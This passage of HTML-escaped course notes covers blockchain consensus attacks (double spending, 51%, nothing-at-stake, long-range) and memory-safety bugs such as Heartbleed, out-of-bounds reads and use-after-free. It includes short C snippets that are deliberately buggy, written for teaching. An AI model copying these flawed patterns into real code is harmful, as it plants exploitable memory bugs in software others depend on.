        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;each block contains a hash of the previous block&lt;/li&gt;
&lt;li&gt;header: hash of previous block and hash of current block&amp;rsquo;s payload
&lt;ul&gt;
&lt;li&gt;this is better because ensures authencity of the payload&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;payload: app specific info&lt;/li&gt;
&lt;li&gt;Making it harder to revert transactions:
&lt;ul&gt;
&lt;li&gt;Ensure that the first k bits of the header hash starts with 0. Expect 2&lt;sup&gt;k&lt;/sup&gt; hash operations to find a valid N such that header is &lt;code&gt;HN...R&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;N is nonce. Need to find a nonce such that the header hash remains unchanged&lt;/li&gt;
&lt;li&gt;Deterrent: longer chains are preferred over shorter chains
&lt;ul&gt;
&lt;li&gt;Need hash power equal to blocks between chain head and the crucial block times 2&lt;sup&gt;k&lt;/sup&gt;&lt;/li&gt;
&lt;li&gt;would need to mine slower than the rest of the participants&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;confrmation-level&#34; &gt;Confrmation Level
&lt;span&gt;
    &lt;a href=&#34;#confrmation-level&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Why do we need extra blocks when there is no 51% power?&lt;/li&gt;
&lt;li&gt;Pre-mining of a block which is revealed after transaction is sent&lt;/li&gt;
&lt;li&gt;Send two transactions in a short window to trigger a fork&lt;/li&gt;
&lt;li&gt;Send two transactions to seperate haves of the network&lt;/li&gt;
&lt;li&gt;Drawbacks:
&lt;ul&gt;
&lt;li&gt;slow confirmation (10 minutes to confirm on bitcoin, with waiting for 6)&lt;/li&gt;
&lt;li&gt;vulnerable to 51%&lt;/li&gt;
&lt;li&gt;energy consumption since hashing doesn&amp;rsquo;t do anything else
&lt;ul&gt;
&lt;li&gt;running a payment system is important though&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;proof-of-stake&#34; &gt;Proof of Stake
&lt;span&gt;
    &lt;a href=&#34;#proof-of-stake&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Chance of node being elected to propose a new block is proportional to its staked value&lt;/li&gt;
&lt;li&gt;collisions not allowed, only leader creates a block&lt;/li&gt;
&lt;li&gt;If more than 50% of staked resources are controled, then attacker can prove fraudulent transactions
&lt;ul&gt;
&lt;li&gt;Attacker loses the weapon to future attacks, and is not easily recoverable&lt;/li&gt;
&lt;li&gt;Solution is to hard fork to invalidate fradulent transactions added by attacker&lt;/li&gt;
&lt;li&gt;social coordination is required&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;chain-validation-nothing-at-stake&#34; &gt;Chain Validation (Nothing at Stake)
&lt;span&gt;
    &lt;a href=&#34;#chain-validation-nothing-at-stake&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Attacker double spends (1% stake)&lt;/li&gt;
&lt;li&gt;Next block proposer has no incentive to select which chain to converge on and has no idea which chain survives in the future, so mines both&lt;/li&gt;
&lt;li&gt;When it&amp;rsquo;s alice&amp;rsquo;s turn again, she chooses the favouralbe block&lt;/li&gt;
&lt;li&gt;Ethereum Slash protocol
&lt;ul&gt;
&lt;li&gt;Penalize those who &amp;ldquo;equivocated&amp;rdquo; (voted on two different versions)&lt;/li&gt;
&lt;li&gt;Penalize those who voted on the wrong block regardless of if they double-voted&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;long-range-attacks-bootstrapping&#34; &gt;Long Range Attacks (Bootstrapping)
&lt;span&gt;
    &lt;a href=&#34;#long-range-attacks-bootstrapping&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Bob first joins the network, which chain to accept?
&lt;ul&gt;
&lt;li&gt;Not expensive at all to create a counterfeit chain&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Casper (ethereum) depends on trusted nodes to broadcast the correct block hash&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;common-bugs-and-vulnerabilities&#34; &gt;Common Bugs and Vulnerabilities
&lt;span&gt;
    &lt;a href=&#34;#common-bugs-and-vulnerabilities&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;memory-errors&#34; &gt;Memory Errors
&lt;span&gt;
    &lt;a href=&#34;#memory-errors&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;a bug where memory not intended to be read or modified is read or modified&lt;/li&gt;
&lt;li&gt;Heartbleed Vulnerability
&lt;ul&gt;
&lt;li&gt;Tell server more length than actually supplied&lt;/li&gt;
&lt;li&gt;Server ended up returning more than required string&lt;/li&gt;
&lt;li&gt;Affected 70%&lt;/li&gt;
&lt;li&gt;CRA was affected and 900 taxpayers&amp;rsquo; identities were stolen&lt;/li&gt;
&lt;li&gt;RCMP charged computer science student (unauthroized use of computer and mischeif)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; buff[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; correct = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// in GCC convention, this variable will appear before the buff buff[0],...,buff[7],correct
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;von-neumann-architecture&#34; &gt;Von Neumann Architecture
&lt;span&gt;
    &lt;a href=&#34;#von-neumann-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CPU does not care about semantics&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-memory&#34; &gt;What is Memory
&lt;span&gt;
    &lt;a href=&#34;#what-is-memory&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Text (program code), Stack, Heap, Global (static)&lt;/li&gt;
&lt;li&gt;Linux x86-64 convetion
&lt;ul&gt;
&lt;li&gt;Environment&lt;/li&gt;
&lt;li&gt;Stack (grows to lower addresses)&lt;/li&gt;
&lt;li&gt;Heap&lt;/li&gt;
&lt;li&gt;BSS&lt;/li&gt;
&lt;li&gt;Data (read from program binary as well - GLOBAL/STATIC)&lt;/li&gt;
&lt;li&gt;Text (lower address)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;heap-vs-stack&#34; &gt;Heap vs. Stack
&lt;span&gt;
    &lt;a href=&#34;#heap-vs-stack&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Must be manually managed&lt;/li&gt;
&lt;li&gt;Any program can apparently use just the stack&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-does-malloc-do&#34; &gt;what does malloc() do?
&lt;span&gt;
    &lt;a href=&#34;#what-does-malloc-do&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;malloc is provided by the clib (e.g. glibc)&lt;/li&gt;
&lt;li&gt;in low level sense, the program has to check for the next available free memory spot&lt;/li&gt;
&lt;li&gt;first request big chunk of memory from the OS&lt;/li&gt;
&lt;li&gt;then the glibc will chunk the 4MB for the program to handle the smaller malloc&amp;rsquo;s&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-does-free-do&#34; &gt;What does free do?
&lt;span&gt;
    &lt;a href=&#34;#what-does-free-do&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap&#34;&gt;How2Heap&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;what-is-safe-in-memory-safety&#34; &gt;What is safe in memory safety?
&lt;span&gt;
    &lt;a href=&#34;#what-is-safe-in-memory-safety&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Observation 1: At runtime, memory is a pool of objects&lt;/li&gt;
&lt;li&gt;Observation 2: Each objet has known andlimited &lt;strong&gt;size&lt;/strong&gt; and &lt;strong&gt;lifetime&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Observation 3: Once allocated, the size of an object never changes&lt;/li&gt;
&lt;li&gt;Observation 4: Memory access is always object-oriented
&lt;ul&gt;
&lt;li&gt;Memory read: (object_id, offset, length)&lt;/li&gt;
&lt;li&gt;Memory write: (object_id, offset, length, value)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The following code is illegal, since the address is not up to the program but the OS/compiler.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *p = &lt;span style=&#34;color:#3677a9&#34;&gt;0xdeadbeef&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; v = *p;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Spatial safety violations&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; x) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; arr[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;] = {&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; arr[x]; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// array was not initialized fully
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; a = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; *(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; *)(&amp;amp;a); &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// reading 8 bytes from a 4 byte valuefg
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *p) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// what if p == NULL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; *p + &lt;span style=&#34;color:#3677a9&#34;&gt;42&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;what-is-temporal-safety&#34; &gt;What is temporal safety?
&lt;span&gt;
    &lt;a href=&#34;#what-is-temporal-safety&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;For any object during a program execution, we know its (object_id, size [int], alive [bool]).&lt;/li&gt;
&lt;li&gt;For each memory access, we know.
&lt;ul&gt;
&lt;li&gt;memory read: (object_id, offset [int], length [int])&lt;/li&gt;
&lt;li&gt;memory write: (object_id, offset [int], length [int])&lt;/li&gt;
&lt;li&gt;memory free: (object_id)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;violations:
&lt;ul&gt;
&lt;li&gt;read: status != init&lt;/li&gt;
&lt;li&gt;write: status == dead&lt;/li&gt;
&lt;li&gt;free: status == dead&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *p = &lt;span style=&#34;color:#447fcf&#34;&gt;malloc&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  *p = &lt;span style=&#34;color:#3677a9&#34;&gt;42&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;free&lt;/span&gt;(p);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; *p;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *ptr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;foo&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; p = &lt;span style=&#34;color:#3677a9&#34;&gt;100&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ptr = &amp;amp;p;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;bar&lt;/span&gt;() {
